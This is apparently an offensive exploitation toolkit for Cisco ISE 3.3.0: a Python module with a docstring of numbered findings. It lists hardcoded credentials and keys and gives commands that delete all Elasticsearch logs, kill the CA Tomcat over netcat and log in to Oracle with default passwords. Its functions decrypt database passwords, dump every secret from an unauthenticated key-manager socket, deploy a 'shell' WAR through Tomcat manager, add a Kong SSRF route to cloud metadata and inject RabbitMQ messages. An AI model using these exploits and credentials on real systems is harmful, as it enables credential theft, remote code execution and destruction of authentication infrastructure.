Elasticsearch 6.8.12 on ISE MNT (Monitoring & Troubleshooting) node:
  Port:     9200 (HTTP, NOT HTTPS — HTTP="HTTP" in control script)
  Binding:  localhost (default ES behavior, control script uses localhost:$ES_PORT)
  Auth:     None (x-pack.security.enabled not configured; default=false in 6.x)
  TLS:      None

Data stored: ISE authentication logs, RADIUS accounting records, endpoint profiling data,
             syslog events, session monitoring data (the MNT node's entire log archive).

From any local process (ISE-F1 chain or other local code exec):
  curl http://localhost:9200/_cat/indices                    # list all indices
  curl http://localhost:9200/_search?pretty&size=100         # dump all records
  curl -XDELETE http://localhost:9200/_all                   # delete all ISE log data

  Also confirmed: control script uses DELETE /_all for maintenance:
    HTTP_STAT=$( curl -m 50 -I -k -XDELETE $HTTP://localhost:$ES_PORT/_all ... )

Impact: MNT node breach = complete ISE authentication history exfiltration.
All RADIUS auths, 802.1X logs, guest access records, posture events, profiling data.

=== ISE-F16: CA Tomcat hardcoded manager:password ===

Source: CSCOcpm-ca_common-3.3.0-430.x86_64.rpm
File:   /opt/CSCOcpm/appsrv/apache-tomcat-ca-9.0.73/conf/tomcat-users.xml
Entry:  <user username="manager" password="password" roles="standard,manager"/>

The ISE internal CA Tomcat instance (separate from main ISE Tomcat, port 9444) ships
with a hardcoded credential: manager:password. The roles "standard" and "manager" are
ISE CA application roles used by the UserDatabaseRealm configured in server.xml Engine.

This differs from ISE-F3 (main Tomcat, empty-password user with Tomcat Manager API roles).
ISE-F16 is a full privileged CA application credential with both standard and manager roles.

CA Tomcat serves:
  - CA REST API   (/caservice) — Jersey JAX-RS: com.cisco.cpm.caservice.api
  - SCEP API      (/scep) — com.cisco.cpm.scep.CertServlet
  - EST API       (/est) — com.cisco.cpm.caservice.est.ESTServlet
  - OCSP responder (separate service, port 2560)

The UserDatabaseRealm protects CA endpoints via security-constraint (if any).
Even without deployed Manager app, manager:password authenticates to any
container-managed auth-protected CA endpoint.

Combined with ISE-F18 (HTTP-only port 9444): credentials transmitted in plaintext.

Exploitation:
  curl -u 'manager:password' http://<ise-host>:9444/caservice/api/<endpoint>
  # SCEP (unauthenticated by protocol design):
  curl http://<ise-host>:9444/scep?operation=GetCACert&message=<CAIdentifier>

=== ISE-F17: CA Tomcat default SHUTDOWN secret (port 8105) ===

Source: CSCOcpm-ca_common-3.3.0-430.x86_64.rpm
File:   /opt/CSCOcpm/appsrv/apache-tomcat-ca-9.0.73/conf/server.xml
Entry:  <Server port="8105" shutdown="SHUTDOWN">

CA Tomcat uses Tomcat's default shutdown string "SHUTDOWN" on port 8105.
Compare ISE-F4: main ISE Tomcat uses a randomized secret on port 8005 (different behavior).

Impact: DoS to ISE Certificate Authority Service (kills CA signing, SCEP, EST, OCSP).
  echo -n 'SHUTDOWN' | nc localhost 8105
  -> CA Tomcat terminates; ca-servercontrol.sh stop path not invoked cleanly.

During an engagement: kill CA service -> endpoint cert enrollment failures -> device quarantine.

=== ISE-F18: CA REST API / OCSP running plain HTTP ===

Source: CSCOcpm-ca_common-3.3.0-430.x86_64.rpm
File:   /opt/CSCOcpm/appsrv/apache-tomcat-ca-9.0.73/conf/server.xml

Active connector (port 9444):
  <Connector scheme="http" port="9444" ... keystoreFile="...myKeyStore" />
  SSLEnabled not set, scheme="http" -> PLAIN HTTP

Commented-out HTTPS connector (port 9445):
  <!--Connector SSLEnabled="true" scheme="https" port="9445"
      keystoreType="PKCS11" truststoreType="PKCS11"
      SSLImplementation="org.apache.tomcat.util.net.jsse.IseJSSEImplementation"
      ciphers="TLS_RSA_WITH_AES_128_GCM_SHA256,..." /-->

OCSP responder (port 2560): also plain HTTP.

Consequence: ISE CA REST API traffic (certificate signing requests via SCEP/EST,
CA key operations) traverses internal ISE network in plaintext. MITM on the ISE
management or internal network segment intercepts/forges CA API calls.

Combined with ISE-F16: manager:password sent in plaintext Basic Auth over HTTP.

=== ISE-F19: CA NSS DB plaintext password window ===

Source: CSCOcpm-ca_common-3.3.0-430.x86_64.rpm
File:   /opt/CSCOcpm/bin/ca-servercontrol.sh

NSS DB contains the ISE internal CA private signing key (X.509 CA for endpoint certs).
The NSS DB password is managed by initNSSDB():

createNSSDB():
  $PRRT_BIN/secureCLI -gen-pswd -o $CA_APACHE_HOME/conf/ca_nssdb_password.txt -n 24 ...
  # Plaintext password in ca_nssdb_password.txt — no chmod restriction applied here
  certutil -N -d ca_nssdb/ -f ca_nssdb_password.txt  # used immediately for DB init

nssDBPasswordEncrypt():
  value=`cat ca_nssdb_password.txt`
  java ... com.cisco.cpm.caservice.CaNSSDBPassword "$value"  # encrypts to ca_nssdb_password_encrypt.txt
  chown -R iseca:ise $CA_APACHE_HOME/conf/*                  # chown but NO chmod on plaintext
  chmod 600 ca_nssdb_password_encrypt.txt                    # only the encrypted file gets 600

initNSSDB upgrade branch (lines 169-171 ca-servercontrol.sh):
  if ca_nssdb_password.txt exists AND ca_nssdb_password_encrypt.txt missing:
    -> nssDBPasswordEncrypt() called -> plaintext window exists on ALL pre-upgrade ISE nodes

The plaintext file receives no chmod before encryption completes.
After chown -R iseca:ise, the file is readable by any process running as user iseca
(CA Tomcat runs as iseca) or any ise group member.

Attack path (local, any ise group member):
  cat /opt/CSCOcpm/appsrv/apache-tomcat-ca/conf/ca_nssdb_password.txt
  -> NSS DB password -> certutil -K -d ca_nssdb/ -f ... -> list all CA private keys
  -> Export CA private key -> forge ISE endpoint certificates for any device

=== ISE-F1+F2 Combined Chain ===

Local process (SSRF, cron, sudo, any ISE service running as non-root):
  1. curl --unix-socket /var/run/key_manager.sock http://localhost/api/system/v1/key-manager/all_data
     -> key_manager_passphrase = "<sha256_passphrase>"
  2. Decrypt key_manager AES ciphertext -> raw KEK bytes
  3. Read KEK_KEY from /opt/CSCOcpm/appsrv/apache-tomcat-9.0.73/config/db.properties
  4. TPMUtil fallback path (pre-3.3 upgrade systems): KEK = Base64.decode(KEK_KEY) directly
  5. Use KEK as AES-128-CBC key + IV from PAP_ADMIN_PWD ciphertext
  6. Decrypt PAP_ADMIN_PWD -> Oracle SYS/SYSTEM password
  7. sqlplus system/<decrypted_pw>@localhost:1521/cpm10 as sysdba -> full DB access

Default-state shortcut (no KEK present):
  sqlplus cepm/U0l1_6v#k3c@localhost:1521/cpm10
  sqlplus system/U0l1_6v#k3c@localhost:1521/cpm10 as sysdba

=== ISE-F23: ESAPI MasterKey/MasterSalt hardcoded — decryption oracle for ISE web layer ===

Source: PSP-Commons-3.3.0-430.jar / ESAPI.properties (packed in JAR root)
Library: OWASP ESAPI (Enterprise Security API) org.owasp.esapi.reference.crypto.JavaEncryptor

Hardcoded values (identical on all ISE 3.3.0.430 deployments):
  Encryptor.MasterKey  = a6H9is3hEVGKB4Jut+lOVA==  (16 bytes = AES-128-CBC key)
  Encryptor.MasterSalt = SbftnvmEWD5ZHHP+pX3fqugNysc=  (20 bytes = HMAC-SHA1 salt)

ESAPI JavaEncryptor default configuration:
  Cipher: AES/CBC/PKCS5Padding (128-bit key)
  MAC:    HMAC-SHA1 using MasterSalt-derived key
  IV:     Random per encryption, prepended to ciphertext

Impact:
  - Decrypt any ESAPI-encrypted form field or request parameter in ISE web interface
  - Forge HMAC-authenticated ESAPI tokens (CSRF tokens, signed session data)
  - Any data stored with ESAPI encrypt() in Oracle DB is decryptable offline
  - ESAPI is used for: web input protection, encrypted URL parameters, signed state tokens

Attack: capture ISE HTTP response with ESAPI-encrypted params -> decrypt offline with static key
Result: plaintext of encrypted web layer data; ability to forge arbitrary ESAPI tokens

ESAPI comment in ESAPI.properties:
  "There is not currently any support for key rotation, so be careful when changing
   your key and salt as it will invalidate all signed, encrypted, and hashed data."
  -> Key will NOT rotate; this is a permanent backdoor for all ISE 3.3.0 installations.

=== ISE-F22: pi-profiler Docker image hardcoded credentials ===

Source: pi-profiler:3.3.0.128 Docker image (inside CSCOcpm-pi-profiler-3.3.0-430.x86_64.rpm)
Layer:  9b53f2db... / app/rmq.properties AND app/application-dev.properties

Hardcoded RabbitMQ credential (NOT a dev-profile-only value — present in generic rmq.properties):
  rmq.hostname=169.254.2.2
  rmq.port=5672
  rmq.username=rabbitmq
  rmq.password=p#t91PMsjekd

pi-profiler Spring Actuator management credential (dev/local profiles):
  pi.profiler.username=admin   (from application.properties, all profiles)
  pi.profiler.password=lab123  (from application-dev.properties + application-local.properties)
  Endpoint: http://<ise>:9096/pi-profiler/actuator/

Context:
  - pi-profiler is a Spring Boot app connecting to ISE's internal RabbitMQ (Docker bridge 169.254.2.2)
  - In production (SPRING_PROFILE=prod,batch), RabbitMQ password is expected from external config
    at /opt/pi-profiler/config/custom.properties or env injection
  - rmq.properties is the dev/CI default — may function as fallback if external config absent
  - p#t91PMsjekd is either the actual dev/staging RabbitMQ password or a CI artifact
  - admin:lab123 is the management API default if running in dev/local profile

Actuator endpoints exposed (management.endpoints.web.exposure.include=prometheus,metrics,health):
  GET http://<ise>:9096/pi-profiler/actuator/health
  GET http://<ise>:9096/pi-profiler/actuator/prometheus
  GET http://<ise>:9096/pi-profiler/actuator/metrics

Additional: ISE AI Agent (Kairos) binary (21MB Go binary, ise-ai-agent:3.3-0.1.6)
  - Connects to Cisco Kairos cloud platform
  - Imports: cisco.com/kairos-common/v3/pkg/cloudproxy
  - Contains /debug/pprof/ Go profiling endpoint (may be exposed locally)
  - AWS SDK integration (GetFederationTokenInput, AssumeRoleWithSAMLInput)
    -> ISE AI agent may use AWS STS for cloud connectivity; AWS creds via key_manager (ISE-F1 chain)

=== ISE-F25: Kairos AI agent hardcoded production cloud endpoint + version disclosure ===

Source: ise-ai-app Docker layer (be4cf5f9.../layer.tar -> ise-agent binary, 21MB Go ELF)
Binary: extracted as /tmp/ise-kairos-agent.bin

Hardcoded production endpoint:
  https://api.euc1.prd.kairos.ciscolabs.com/ingest/v1/stable-ise

Path decomposition:
  api.euc1.prd.kairos.ciscolabs.com  -> Cisco Kairos platform, EU-central-1 (Frankfurt AWS), PRD env
  /ingest/v1/stable-ise              -> API version (v1), product variant ("stable-ise")

Agent version string (extractable via strings):
  ise-agent-v0.1.6

Additional extracted strings:
  "x-kairos-checksum-%s"             -> custom integrity header name
  "EC2IMDSEndpoint"                  -> AWS IMDS endpoint reference (Cisco cloud infra)
  "AssumeRole"                       -> AWS STS role assumption
  "cisco.com/kairos-common/v3"       -> Go module path for Kairos shared library

Authentication: mTLS via client certificate ("api-proxy-cert" / "newClientCert")
  -> provisioned at runtime by cisco.com/kairos-common/v3/pkg/ca
  -> no hardcoded API tokens or secrets in binary

Impact: LOW — endpoint is Cisco-controlled. No credentials exposed.
  Disclosure: exact agent version fingerprinting; CI/CD path enumeration via variant naming;
  confirms ISE 3.3.0 installations phone home to EU-central-1 AWS on port 443.

"""

import os
import base64
import struct
import hashlib
from pathlib import Path
from typing import Optional


# ---------------------------------------------------------------------------
# ISE-F2: 3DES Oracle credential decryption
# ---------------------------------------------------------------------------

DEFAULT_ENCRYPT_KEY = b'ASDF asdf 1234 8983 jkla'  # 24 bytes, DESede key material
DEFAULT_DB_PWD_CT   = "pTZv2LEjfGPX5YICzJb95g=="    # shipped in db.properties


def decrypt_legacy_ise_db_password(ciphertext_b64: str, key: bytes = DEFAULT_ENCRYPT_KEY) -> str:
    """
    Decrypt an ISE db.properties password encrypted with the default 3DES-ECB key.

    Uses DefaultCryptEncryptor's legacy path (useNewKey=false):
      - Algorithm: DESede (3DES) in ECB mode, PKCS5 padding
      - Key: encryptionKey.getBytes() = "ASDF asdf 1234 8983 jkla" (24 bytes)
      - IV: none (ECB)

    Returns plaintext string with PKCS5 padding stripped.
    """
    from Crypto.Cipher import DES3
    ct = base64.b64decode(ciphertext_b64)
    cipher = DES3.new(key, DES3.MODE_ECB)
    pt_padded = cipher.decrypt(ct)
    pad_len = pt_padded[-1]
    return pt_padded[:-pad_len].decode('utf-8', errors='replace')


def decrypt_ise_db_password_from_kek(ciphertext_b64: str, kek_bytes: bytes) -> str:
    """
    Decrypt ISE db.properties password using a recovered KEK (AES-128-CBC path).

    After ISE initial setup, useNewKey=true and useCBCMode=true.
    Crypt(AES, kek_bytes, iv_bytes, AES_CBS_PADDING):
      - Algorithm: AES/CBC/PKCS5Padding
      - Key: kek_bytes (16 or 32 bytes)
      - IV: prepended to ciphertext (first 16 bytes) OR stored separately

    Check Crypt constructor: new Crypt("AES", newEncryptionKey, iv, AES_CBS_PADDING)
    The iv field is stored in DefaultCryptEncryptor.iv (byte[]).
    Ciphertext in db.properties is Base64 of IV+ciphertext or ciphertext alone.
    """
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    ct_raw = base64.b64decode(ciphertext_b64)
    if len(ct_raw) > 16 and len(ct_raw) % 16 == 0:
        iv = ct_raw[:16]
        ct = ct_raw[16:]
    else:
        iv = b'\x00' * 16
        ct = ct_raw
    key = kek_bytes[:16] if len(kek_bytes) >= 16 else kek_bytes.ljust(16, b'\x00')
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt_padded = cipher.decrypt(ct)
    return unpad(pt_padded, 16).decode('utf-8', errors='replace')


# ---------------------------------------------------------------------------
# ISE-F1: key_manager UNIX socket probe
# ---------------------------------------------------------------------------

KEY_MANAGER_SOCK = "/var/run/key_manager.sock"
KEY_MANAGER_ALL_DATA_PATH = "/api/system/v1/key-manager/all_data"


def dump_all_key_manager_secrets(sock_path: str = KEY_MANAGER_SOCK) -> Optional[dict]:
    """
    ISE-F12: GET /api/system/v1/key-manager/all_data via world-writable UNIX socket.

    Returns the full key_manager in-memory cache: all sealed keys in plaintext
    (key_mgr_passphrase, Oracle DB password, Meraki API key, etc.) plus TPM2 manager password.

    No authentication required — @ensure_key_manager_is_initialized checks is_initialized
    (always True on a running ISE system), not caller identity.

    World-writable socket via ISE-F13: ExecStartPost=chmod o+w /var/run/key_manager.sock
    Any local process can connect regardless of UID.

    Returns dict with 'result' key containing:
      {"sealed_keys": [{"data_type": ..., "data": "<plaintext_secret>", ...}],
       "tpm2_mgr_password": "..."}
    """
    import socket
    import json

    request = (
        f"GET {KEY_MANAGER_ALL_DATA_PATH} HTTP/1.1\r\n"
        f"Host: localhost\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()

    try:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.connect(sock_path)
        sock.sendall(request)
        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        sock.close()
        header_end = response.find(b"\r\n\r\n")
        if header_end == -1:
            return None
        body = response[header_end + 4:]
        return json.loads(body.decode('utf-8', errors='replace'))
    except Exception:
        return None


def probe_key_manager_socket(sock_path: str = KEY_MANAGER_SOCK) -> Optional[dict]:
    """
    Call GET /api/system/v1/key-manager/all_data via key_manager UNIX socket.

    Requires: curl or Python socket, local access.
    Returns parsed JSON dict of all cached TPM2 secrets, or None on failure.

    Equivalent shell:
      curl -s --unix-socket /var/run/key_manager.sock \\
        http://localhost/api/system/v1/key-manager/all_data
    """
    import socket
    import json

    request = (
        f"GET {KEY_MANAGER_ALL_DATA_PATH} HTTP/1.1\r\n"
        f"Host: localhost\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()

    try:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.connect(sock_path)
        sock.sendall(request)
        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        sock.close()
        header_end = response.find(b"\r\n\r\n")
        if header_end == -1:
            return None
        body = response[header_end + 4:]
        return json.loads(body.decode('utf-8', errors='replace'))
    except Exception:
        return None


# ---------------------------------------------------------------------------
# ISE-F3: Tomcat manager — empty-password WAR deploy
# ---------------------------------------------------------------------------

def check_tomcat_manager_auth(host: str, port: int = 8080, user: str = "user", password: str = "") -> bool:
    """
    Probe Tomcat manager /text/list with the empty-password account.
    Returns True if 200 OK with application list.
    """
    import urllib.request
    import urllib.error
    import base64

    creds = base64.b64encode(f"{user}:{password}".encode()).decode()
    url = f"http://{host}:{port}/manager/text/list"
    req = urllib.request.Request(url, headers={"Authorization": f"Basic {creds}"})
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status == 200
    except urllib.error.HTTPError as e:
        return e.code == 200
    except Exception:
        return False


def deploy_war_via_tomcat_manager(
    host: str,
    war_path: str,
    context_path: str = "/shell",
    port: int = 8080,
    user: str = "user",
    password: str = ""
) -> bool:
    """
    Deploy a WAR file via Tomcat manager-script API (empty-password user).
    Returns True if deployment succeeded (200 OK with "OK" body).

    Equivalent:
      curl -u 'user:' -T shell.war 'http://<host>:8080/manager/text/deploy?path=/shell'
    """
    import urllib.request
    import urllib.error
    import base64

    creds = base64.b64encode(f"{user}:{password}".encode()).decode()
    url = f"http://{host}:{port}/manager/text/deploy?path={context_path}"
    with open(war_path, 'rb') as f:
        war_data = f.read()
    req = urllib.request.Request(url, data=war_data, method='PUT', headers={
        "Authorization": f"Basic {creds}",
        "Content-Type": "application/octet-stream",
        "Content-Length": str(len(war_data)),
    })
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            body = resp.read().decode()
            return resp.status == 200 and body.startswith("OK")
    except Exception:
        return False


# ---------------------------------------------------------------------------
# ISE-F4: Tomcat shutdown via hardcoded secret
# ---------------------------------------------------------------------------

TOMCAT_SHUTDOWN_SECRET = "721AzznFfen8pMjy"
TOMCAT_SHUTDOWN_PORT   = 8005


def send_tomcat_shutdown(host: str = "localhost", port: int = TOMCAT_SHUTDOWN_PORT,
                         secret: str = TOMCAT_SHUTDOWN_SECRET) -> bool:
    """
    Send Tomcat shutdown command using the hardcoded secret shipped in ISE 3.3.0 server.xml.
    Returns True if connection succeeded (Tomcat may or may not be listening on 8005 externally).
    """
    import socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        sock.sendall(secret.encode())
        sock.close()
        return True
    except Exception:
        return False


# ---------------------------------------------------------------------------
# ISE-F1+F2 chain: local TPM secret extraction -> Oracle credential
# ---------------------------------------------------------------------------

def ise_local_full_chain(db_props_path: str = "/opt/CSCOcpm/appsrv/apache-tomcat-9.0.73/config/db.properties") -> dict:
    """
    Execute full ISE-F1+F2 local privilege chain:
      1. Probe key_manager socket -> extract passphrase
      2. Read KEK_KEY from db.properties
      3. Decrypt Oracle DB password

    Returns dict with extracted secrets.
    """
    result = {}

    # Step 1: key_manager dump
    km_data = probe_key_manager_socket()
    if km_data:
        result['key_manager_dump'] = km_data
        result['key_manager_passphrase'] = km_data.get('key_manager_passphrase')

    # Step 2: read db.properties
    props = {}
    try:
        with open(db_props_path) as f:
            for line in f:
                line = line.strip()
                if '=' in line and not line.startswith('#'):
                    k, _, v = line.partition('=')
                    props[k.strip()] = v.strip()
    except Exception as e:
        result['db_props_error'] = str(e)

    result['db_props'] = props

    # Step 3: decrypt
    kek_key = props.get('KEK_KEY')
    pap_admin_pwd = props.get('PAP_ADMIN_PWD', DEFAULT_DB_PWD_CT)

    if kek_key is None:
        # Default/pre-setup state: use hardcoded 3DES key
        try:
            plaintext = decrypt_legacy_ise_db_password(pap_admin_pwd)
            result['oracle_password'] = plaintext
            result['oracle_path'] = 'legacy_3des'
        except Exception as e:
            result['decrypt_error'] = str(e)
    else:
        # KEK present: try TPM fallback (pre-3.3 upgrade path = raw base64)
        try:
            kek_bytes = base64.b64decode(kek_key)
            plaintext = decrypt_ise_db_password_from_kek(pap_admin_pwd, kek_bytes)
            result['oracle_password'] = plaintext
            result['oracle_path'] = 'kek_fallback'
        except Exception as e:
            result['kek_decrypt_error'] = str(e)

    return result


# ---------------------------------------------------------------------------
# ISE-F1 upgrade: key_manager decrypt oracle — direct credential extraction
# ---------------------------------------------------------------------------

KEY_MANAGER_DECRYPT_PATH = "/api/system/v1/key-manager/decrypt"


def extract_credential_via_decrypt_oracle(
    ciphertext_b64: str,
    sock_path: str = KEY_MANAGER_SOCK
) -> Optional[str]:
    """
    POST arbitrary ciphertext to key_manager's /decrypt endpoint.
    Returns plaintext string on success, None on failure.

    This is the tpmutil.sh mechanism: ALL ISE TPM encrypt/decrypt routes through
    this unauthenticated UNIX socket endpoint. No KEK analysis needed.

    Equivalent shell:
      curl -s -XPOST --unix-socket /var/run/key_manager.sock \\
        -H "Content-Type: application/json" \\
        --data '{"msg_type":"POST","version":1,"msg":{"action":"decrypt","params":{"data":"<CT>"}}}' \\
        http://localhost/api/system/v1/key-manager/decrypt
    """
    import socket
    import json

    body = json.dumps({
        "msg_type": "POST",
        "version": 1,
        "msg": {"action": "decrypt", "params": {"data": ciphertext_b64}}
    }).encode()

    request = (
        f"POST {KEY_MANAGER_DECRYPT_PATH} HTTP/1.1\r\n"
        f"Host: localhost\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode() + body

    try:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.connect(sock_path)
        sock.sendall(request)
        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        sock.close()
        header_end = response.find(b"\r\n\r\n")
        if header_end == -1:
            return None
        resp_data = json.loads(response[header_end + 4:].decode('utf-8', errors='replace'))
        return resp_data.get("result")
    except Exception:
        return None


def extract_oracle_password_via_oracle(
    db_props_path: str = "/opt/CSCOcpm/appsrv/apache-tomcat-9.0.73/config/db.properties",
    sock_path: str = KEY_MANAGER_SOCK
) -> dict:
    """
    One-command Oracle credential extraction via key_manager decrypt oracle.
    Reads PAP_ADMIN_PWD from db.properties and posts it to /decrypt.
    Works on all initialized ISE 3.3.0 deployments (default + rotated).

    Returns dict: {ciphertext, plaintext, oracle_path}
    """
    props = {}
    try:
        with open(db_props_path) as f:
            for line in f:
                line = line.strip()
                if '=' in line and not line.startswith('#'):
                    k, _, v = line.partition('=')
                    props[k.strip()] = v.strip()
    except Exception as e:
        return {'error': str(e)}

    ct = props.get('PAP_ADMIN_PWD', DEFAULT_DB_PWD_CT)
    pt = extract_credential_via_decrypt_oracle(ct, sock_path)
    return {
        'ciphertext': ct,
        'plaintext': pt,
        'oracle_path': 'key_manager_decrypt',
        'oracle_sock': sock_path,
    }


# ---------------------------------------------------------------------------
# ISE-F6: Kong Admin API — unauthenticated probe
# ---------------------------------------------------------------------------

KONG_ADMIN_PORT = 19001


def probe_kong_admin_api(host: str, port: int = KONG_ADMIN_PORT) -> Optional[dict]:
    """
    GET http://<host>:<port>/ — Kong Admin API root, no auth required.
    Returns parsed JSON dict (Kong version, config, tagline) or None.

    ISE binds Kong admin on 0.0.0.0:19001 via:
      -e "KONG_ADMIN_LISTEN=0.0.0.0:8001, 0.0.0.0:8444 ssl"
      -p 19001:8001
    """
    import urllib.request
    try:
        with urllib.request.urlopen(f"http://{host}:{port}/", timeout=10) as resp:
            import json
            return json.loads(resp.read().decode())
    except Exception:
        return None


def list_kong_services(host: str, port: int = KONG_ADMIN_PORT) -> Optional[list]:
    """
    GET /services — enumerate all Kong proxy services.
    Returns list of service dicts (id, name, host, port, path, protocol).
    """
    import urllib.request
    import json
    try:
        with urllib.request.urlopen(f"http://{host}:{port}/services", timeout=10) as resp:
            data = json.loads(resp.read().decode())
            return data.get('data', [])
    except Exception:
        return None


def list_kong_routes(host: str, port: int = KONG_ADMIN_PORT) -> Optional[list]:
    """GET /routes — all configured routes."""
    import urllib.request
    import json
    try:
        with urllib.request.urlopen(f"http://{host}:{port}/routes", timeout=10) as resp:
            data = json.loads(resp.read().decode())
            return data.get('data', [])
    except Exception:
        return None


def list_kong_consumers(host: str, port: int = KONG_ADMIN_PORT) -> Optional[list]:
    """GET /consumers — API consumers (API key holders)."""
    import urllib.request
    import json
    try:
        with urllib.request.urlopen(f"http://{host}:{port}/consumers", timeout=10) as resp:
            data = json.loads(resp.read().decode())
            return data.get('data', [])
    except Exception:
        return None


def add_kong_ssrf_route(host: str, target_url: str, path: str = "/ssrf",
                        port: int = KONG_ADMIN_PORT) -> Optional[dict]:
    """
    Create a Kong service + route that proxies <path> to <target_url>.
    Use to pivot through Kong to internal services (e.g. 169.254.169.254 metadata).

    Returns the created route dict, or None on failure.
    """
    import urllib.request
    import json

    svc_body = json.dumps({"name": "ssrf-svc", "url": target_url}).encode()
    svc_req = urllib.request.Request(
        f"http://{host}:{port}/services",
        data=svc_body,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    try:
        with urllib.request.urlopen(svc_req, timeout=10) as resp:
            svc = json.loads(resp.read().decode())
        svc_id = svc['id']
        route_body = json.dumps({"paths": [path], "service": {"id": svc_id}}).encode()
        route_req = urllib.request.Request(
            f"http://{host}:{port}/routes",
            data=route_body,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        with urllib.request.urlopen(route_req, timeout=10) as resp:
            return json.loads(resp.read().decode())
    except Exception:
        return None


# ---------------------------------------------------------------------------
# ISE-F7/F8: RabbitMQ management probe
# ---------------------------------------------------------------------------

RABBITMQ_MGMT_PORT   = 15672
RABBITMQ_AMQP_PORT   = 8672
RABBITMQ_DEFAULT_USER = "guest"
RABBITMQ_DEFAULT_PASS = "guest"


def probe_rabbitmq_management(host: str, port: int = RABBITMQ_MGMT_PORT,
                               user: str = RABBITMQ_DEFAULT_USER,
                               password: str = RABBITMQ_DEFAULT_PASS) -> Optional[dict]:
    """
    GET /api/overview from RabbitMQ management HTTP API (port 15672).
    Default creds: guest:guest (loopback_users.guest=false in ISE rabbitmq.conf).
    Returns parsed overview JSON, or None on failure.

    ISE binds management on 0.0.0.0:15672 with no TLS (management.listener.ssl=false).
    """
    import urllib.request
    import json
    import base64

    creds = base64.b64encode(f"{user}:{password}".encode()).decode()
    req = urllib.request.Request(
        f"http://{host}:{port}/api/overview",
        headers={"Authorization": f"Basic {creds}"}
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return json.loads(resp.read().decode())
    except Exception:
        return None


def list_rabbitmq_queues(host: str, vhost: str = "%2F",
                          port: int = RABBITMQ_MGMT_PORT,
                          user: str = RABBITMQ_DEFAULT_USER,
                          password: str = RABBITMQ_DEFAULT_PASS) -> Optional[list]:
    """GET /api/queues/<vhost> — enumerate RabbitMQ queues and message counts."""
    import urllib.request
    import json
    import base64

    creds = base64.b64encode(f"{user}:{password}".encode()).decode()
    req = urllib.request.Request(
        f"http://{host}:{port}/api/queues/{vhost}",
        headers={"Authorization": f"Basic {creds}"}
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return json.loads(resp.read().decode())
    except Exception:
        return None


def publish_rabbitmq_message(host: str, exchange: str, routing_key: str, payload: str,
                              vhost: str = "%2F",
                              port: int = RABBITMQ_MGMT_PORT,
                              user: str = RABBITMQ_DEFAULT_USER,
                              password: str = RABBITMQ_DEFAULT_PASS) -> Optional[dict]:
    """
    POST /api/exchanges/<vhost>/<exchange>/publish — inject a message.
    Used to test ISE internal messaging bus poisoning via guest:guest pre-setup.
    Returns management API response dict.
    """
    import urllib.request
    import json
    import base64

    creds = base64.b64encode(f"{user}:{password}".encode()).decode()
    body = json.dumps({
        "properties": {},
        "routing_key": routing_key,
        "payload": payload,
        "payload_encoding": "string"
    }).encode()
    req = urllib.request.Request(
        f"http://{host}:{port}/api/exchanges/{vhost}/{exchange}/publish",
        data=body,
        headers={
            "Authorization": f"Basic {creds}",
            "Content-Type": "application/json",
        },
        method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return json.loads(resp.read().decode())
    except Exception:
        return None


# ---------------------------------------------------------------------------
# Ablation registration
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# ISE-F10: SSE Connector — probe NoCertToken endpoint
# ---------------------------------------------------------------------------

SSE_CONNECTOR_PORT = 8989
SSE_NOCERT_REGISTRY_PATH = "/v1/contexts/{ctxt_id}/services/registry"


def probe_sse_connector(host: str, port: int = SSE_CONNECTOR_PORT,
                        ctxt_id: str = "0") -> Optional[int]:
    """
    Probe SSE connector port 8989 HTTPS.
    Returns HTTP status code from GET /v1/contexts, or None if unreachable.

    ISE binds SSE connector on 0.0.0.0:8989 (interface = "all" in connector.toml).
    TLS server cert at /opt/sse/certificates/ssecert.pem (self-signed).
    """
    import ssl
    import http.client
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        conn = http.client.HTTPSConnection(host, port, context=ctx, timeout=10)
        conn.request("GET", "/v1/contexts")
        resp = conn.getresponse()
        return resp.status
    except Exception:
        return None


def nocert_register_sse_connector(host: str, ctxt_id: str,
                                   payload: dict,
                                   port: int = SSE_CONNECTOR_PORT) -> Optional[dict]:
    """
    POST to SSE connector NoCertTokenHandler: /v1/contexts/{ctxt_id}/services/registry
    No client certificate required (by design — pre-registration path).
    Returns parsed JSON response or None.

    Equivalent:
      curl -sk -X POST -H "Content-Type: application/json" \\
        -d '<payload>' \\
        https://<ise>:8989/v1/contexts/<ctxt_id>/services/registry
    """
    import ssl
    import http.client
    import json

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    body = json.dumps(payload).encode()
    path = f"/v1/contexts/{ctxt_id}/services/registry"
    try:
        conn = http.client.HTTPSConnection(host, port, context=ctx, timeout=10)
        conn.request("POST", path, body=body, headers={
            "Content-Type": "application/json",
            "Content-Length": str(len(body)),
        })
        resp = conn.getresponse()
        data = resp.read().decode('utf-8', errors='replace')
        try:
            return json.loads(data)
        except Exception:
            return {"status": resp.status, "body": data}
    except Exception:
        return None


IRF_RABBIT_USER = "irf"
IRF_RABBIT_PASS = "irf"
IRF_RABBIT_VHOST = "irf"

CA_TOMCAT_PORT         = 9444
CA_TOMCAT_USER         = "manager"
CA_TOMCAT_PASS         = "password"
